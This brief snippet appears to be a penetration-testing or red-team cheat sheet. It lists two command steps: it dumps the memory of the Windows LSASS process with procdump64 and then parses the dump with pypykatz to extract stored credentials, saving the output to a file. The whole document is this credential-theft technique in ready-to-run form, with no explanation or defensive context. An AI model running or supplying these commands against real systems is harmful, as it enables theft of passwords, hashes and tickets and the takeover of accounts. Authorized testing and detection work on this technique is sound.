
#Dump lsass
cd C:\Temp
.\procdump64.exe -ma lsass.exe lsass.dmp


#Use pypykatz
pypykatz lsa minidump ./lsass.DMP| tee pypykatz.out
